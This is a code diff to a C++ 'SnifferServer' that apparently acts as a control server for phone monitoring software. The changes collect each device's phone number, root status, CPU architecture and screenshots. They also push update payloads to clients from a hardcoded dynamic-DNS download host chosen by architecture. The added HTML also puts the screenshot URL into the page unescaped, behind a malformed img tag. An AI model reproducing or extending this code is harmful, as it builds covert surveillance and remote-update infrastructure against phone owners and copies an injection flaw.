@@ -492,8 +492,7 @@ bool SnifferServer::SendRequestMsg2Client(
 				);
 
 		SCMD* scmd = (SCMD*)sm->buffer;
-		task->GetSendCmd(scmd);
-		scmd->header.seq = seq;
+		task->GetSendCmd(scmd, seq);
 
 		sm->fd = client->fd;
 		sm->len = sizeof(SCMDH) + scmd->header.len;
@@ -798,9 +797,11 @@ void SnifferServer::OnParseCmd(Client* client, SCMD* scmd) {
 
 		        client->deviceId = rootRecv[DEVICE_ID].asString();
 		        client->version = rootRecv[VERSION].asString();
+
 		        client->brand = rootRecv[PHONE_INFO_BRAND].asString();
 		        client->model = rootRecv[PHONE_INFO_MODEL].asString();
 		        client->phoneNumber = rootRecv[PHONE_INFO_NUMBER].asString();
+		        client->abi = rootRecv[PHONE_INFO_ABI].asString();
 		        client->isRoot = rootRecv[IS_ROOT].asBool();
 
 				LogManager::GetLogManager()->Log(
@@ -814,6 +815,23 @@ void SnifferServer::OnParseCmd(Client* client, SCMD* scmd) {
 						client->fd
 						);
 
+			}break;
+			case SnifferScreenCapUpdate:{
+				// 更新客户端截屏
+		        reader.parse(scmd->param, rootRecv);
+
+		        client->screencap = rootRecv[CLIENT_SCREENCAP_URL].asString();
+
+				LogManager::GetLogManager()->Log(
+						LOG_MSG,
+						"SnifferServer::OnParseCmd( "
+						"tid : %d, "
+						"fd : [%d], "
+						"[更新客户端截屏] "
+						")",
+						(int)syscall(SYS_gettid),
+						client->fd
+						);
 			}break;
 			default:break;
 			}
@@ -1262,10 +1280,13 @@ int SnifferServer::GetClientInfo(
 	string deviceId = "";
 	string ip = "";
 	string version = "";
+
 	bool isRoot = false;
 	string brand = "";
 	string model = "";
 	string phoneNumber = "";
+	string abi = "";
+	string screencap = "";
 
 	Client *client = NULL;
 	mClientMap.Lock();
@@ -1276,10 +1297,13 @@ int SnifferServer::GetClientInfo(
 		deviceId = client->deviceId;
 		ip = client->ip;
 		version = client->version;
+
 		isRoot = client->isRoot;
 		brand = client->brand;
 		model = client->model;
 		phoneNumber = client->phoneNumber;
+		abi = client->abi;
+		screencap = client->screencap;
 
 		ret = 1;
 	}
@@ -1331,6 +1355,13 @@ int SnifferServer::GetClientInfo(
 			result += "\n";
 
 			snprintf(line, sizeof(line) - 1,
+					"%-16s : %s\n",
+					"处理器架构",
+					abi.c_str()
+					);
+			result += line;
+
+			snprintf(line, sizeof(line) - 1,
 					"%-15s : %s\n",
 					"手机厂商",
 					brand.c_str()
@@ -1377,6 +1408,13 @@ int SnifferServer::GetClientInfo(
 			result += "\"/>";
 			result += "</form>";
 			result += "\n";
+
+			if( screencap.length() > 0 ) {
+				result += "<img src=\">";
+				result += screencap;
+				result += "\"/>";
+				result += "\n";
+			}
 
 		} else {
 			result += "<b>没有客户端详细信息</b>\n";
@@ -1721,14 +1759,17 @@ int SnifferServer::UpdateClient(
 		Message* sm = mClientTcpServer.GetIdleMessageList()->PopFront();
 		if( sm != NULL ) {
 			SCMD* scmd = (SCMD*)sm->buffer;
+
 			int seq = client->AddSeq();
+			string url = "http://drsniffer.wicp.net:9875/download.cgi?filepath=/update/";
+			url += client->abi;
+			url += "/";
 
 			UpdateClientTask task;
 			task.SetPtType(ptType);
-			task.SetUrl("");
-			task.SetVersion("1.0.1");
-			task.GetSendCmd(scmd);
-			scmd->header.seq = seq;
+			task.SetUrl(url);
+			task.SetVersion("1.0.2");
+			task.GetSendCmd(scmd, seq);
 
 			sm->fd = client->fd;
 			sm->len = sizeof(SCMDH) + scmd->header.len;
